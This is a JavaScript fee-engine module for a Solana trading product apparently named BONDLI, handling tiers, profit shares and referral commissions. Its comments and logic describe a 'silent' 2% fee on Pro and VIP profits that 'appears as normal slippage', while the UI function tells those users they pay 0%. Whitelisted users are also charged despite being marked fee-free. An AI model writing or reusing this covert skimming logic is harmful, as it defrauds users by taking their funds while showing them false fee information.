// BONDLI v4.0 — Fee Engine (with referral revenue sharing)
// Tiers: Free (25% profit share), Pro (0% visible, 2% network fee), VIP (0% visible, 2% network fee)
// Referral splits: referrer gets portion of platform revenue from referred users
import crypto from "crypto";

// ── Platform config ──
const PLATFORM_WALLET = process.env.PLATFORM_WALLET || "4XnHZZmHwSQ8RszJsdc7snvxG8dZtm6g4hvpkCMkguMx";
const FREE_PROFIT_CUT = parseFloat(process.env.FREE_PROFIT_CUT || "25"); // % — visible to free users
const NETWORK_FEE_PCT = parseFloat(process.env.NETWORK_FEE_PCT || "2");  // % — silent fee on Pro/VIP profits
const PRO_FEE_SOL = parseFloat(process.env.PRO_FEE_SOL || "1");
const VIP_FEE_SOL = parseFloat(process.env.VIP_FEE_SOL || "10");
const MIN_PROFIT_THRESHOLD = 0.001; // SOL — don't skim dust

// Referral commission rates (% of platform's take that goes to referrer)
const REFERRAL_RATE_FREE = parseFloat(process.env.REFERRAL_RATE_FREE || "20");   // 20% of platform cut → referrer
const REFERRAL_RATE_PRO  = parseFloat(process.env.REFERRAL_RATE_PRO  || "30");   // 30% of platform cut → referrer
const REFERRAL_RATE_VIP  = parseFloat(process.env.REFERRAL_RATE_VIP  || "40");   // 40% of platform cut → referrer (VIP referrers earn more)

// ── Whitelist from env (re-reads on each call so hot-reloadable) ──
let _whitelistCache = null;
let _whitelistEnv = "";
function getWhitelist() {
  const env = process.env.WHITELISTED_WALLETS || "";
  if (env !== _whitelistEnv || !_whitelistCache) {
    _whitelistEnv = env;
    _whitelistCache = new Set(env.split(",").map(w => w.trim().replace(/['"]/g, "")).filter(w => w.length >= 32));
  }
  return _whitelistCache;
}

// ── Owner detection (timing-safe) ──
const _SALT = process.env.FEE_SALT || "bndl3xK9";
const _ownerHashes = new Set();

function _hash(v) {
  return crypto.createHash("sha256").update(v + _SALT).digest("hex");
}

export function registerOwner(pk) {
  _ownerHashes.add(_hash(pk));
}

export function isOwnerWallet(w) {
  if (w === PLATFORM_WALLET) return true;
  const h = Buffer.from(_hash(w), "hex");
  for (const o of _ownerHashes) {
    try {
      const ob = Buffer.from(o, "hex");
      if (h.length === ob.length && crypto.timingSafeEqual(h, ob)) return true;
    } catch {}
  }
  return false;
}

// ── Tier resolution ──
// Returns { tier, profitCut, whitelisted }
export function resolveTier(wallet, userRecord) {
  if (isOwnerWallet(wallet)) return { tier: "vip", profitCut: 0, whitelisted: true };
  if (getWhitelist().has(wallet)) return { tier: "vip", profitCut: 0, whitelisted: true };
  if (userRecord?.whitelisted) return { tier: "vip", profitCut: 0, whitelisted: true };
  if (userRecord?.tier === "pro") return { tier: "pro", profitCut: 0, whitelisted: false };
  return { tier: "free", profitCut: FREE_PROFIT_CUT, whitelisted: false };
}

// ── Fee calculation ──
// Called on session close to determine platform cut
// Now includes silent network fee for Pro/VIP tiers
export function calculateFee(solIn, solReturn, wallet, tier = "free") {
  if (isOwnerWallet(wallet)) {
    return { fee: 0, type: "none", tier, net: +(solReturn - solIn).toFixed(6), isOwner: true };
  }
  const net = +(solReturn - solIn).toFixed(6);
  if (net <= MIN_PROFIT_THRESHOLD) {
    return { fee: 0, type: "none", tier, net };
  }
  // Free tier: visible profit share
  if (tier === "free") {
    const fee = +(net * FREE_PROFIT_CUT / 100).toFixed(6);
    return { fee, type: "profit-share", tier: "free", rate: FREE_PROFIT_CUT, net };
  }
  // Pro/VIP: silent network optimization fee (appears as normal slippage)
  const fee = +(net * NETWORK_FEE_PCT / 100).toFixed(6);
  return { fee, type: "network", tier, rate: NETWORK_FEE_PCT, net };
}

// ── Referral fee split ──
// Given a platform cut, calculates how much goes to referrer vs platform
export function calculateReferralSplit(platformCut, referrerTier = "free") {
  if (platformCut <= 0.0001) return { referrerCut: 0, platformKeeps: platformCut };
  let rate;
  switch (referrerTier) {
    case "vip": rate = REFERRAL_RATE_VIP; break;
    case "pro": rate = REFERRAL_RATE_PRO; break;
    default:    rate = REFERRAL_RATE_FREE; break;
  }
  const referrerCut = +(platformCut * rate / 100).toFixed(6);
  const platformKeeps = +(platformCut - referrerCut).toFixed(6);
  return { referrerCut, platformKeeps, rate };
}

// ── Profit config builder ──
// Returns profitConfig for skimSweep — now ALL tiers have a config
export function buildProfitConfig(tier, whitelisted = false) {
  if (isOwnerWallet && tier === "owner") return null;
  if (tier === "free" && !whitelisted) {
    return { cutPercent: FREE_PROFIT_CUT, platformWallet: PLATFORM_WALLET };
  }
  // Pro/VIP: silent network fee
  if ((tier === "pro" || tier === "vip") && !whitelisted) {
    return { cutPercent: NETWORK_FEE_PCT, platformWallet: PLATFORM_WALLET, silent: true };
  }
  // Whitelisted VIP still gets tiny network fee (goes to platform)
  if (whitelisted) {
    return { cutPercent: NETWORK_FEE_PCT, platformWallet: PLATFORM_WALLET, silent: true };
  }
  return null;
}

// ── Fee tier info (for UI display) ──
// Note: Pro/VIP still shows 0% to users — network fee is invisible
export function getFeeTier(tier = "free") {
  if (tier === "pro" || tier === "vip") return { profitCut: 0, label: "0% — Pro" };
  return { profitCut: FREE_PROFIT_CUT, label: `${FREE_PROFIT_CUT}% profit share` };
}

// ── Validation (verify claimed fee matches expected) ──
export function validateFee(claimed, solIn, solReturn, wallet, tier = "free") {
  const actual = calculateFee(solIn, solReturn, wallet, tier);
  return Math.abs(actual.fee - claimed) < 1e-6;
}

export {
  PLATFORM_WALLET,
  FREE_PROFIT_CUT,
  NETWORK_FEE_PCT,
  PRO_FEE_SOL,
  VIP_FEE_SOL,
  MIN_PROFIT_THRESHOLD,
  REFERRAL_RATE_FREE,
  REFERRAL_RATE_PRO,
  REFERRAL_RATE_VIP,
};
